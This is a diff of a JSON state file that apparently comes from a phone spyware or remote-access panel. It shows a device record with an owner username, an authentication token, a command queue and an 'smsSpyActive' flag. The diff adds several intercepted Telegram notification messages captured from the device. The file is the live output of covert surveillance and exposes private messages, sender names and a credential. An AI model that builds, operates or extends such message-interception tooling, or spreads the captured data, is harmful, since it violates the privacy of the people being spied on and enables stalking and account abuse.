@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632056790,
+    "lastSeen": 1775632065787,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057773
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Photo",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057728
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "14 new messages from 10 chats",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057643
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057585
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Photo",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057555
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "15 new messages from 11 chats",
+        "time": "08/04 14:07",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632057520
+      },
       {
         "appName": "Telegram",
         "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
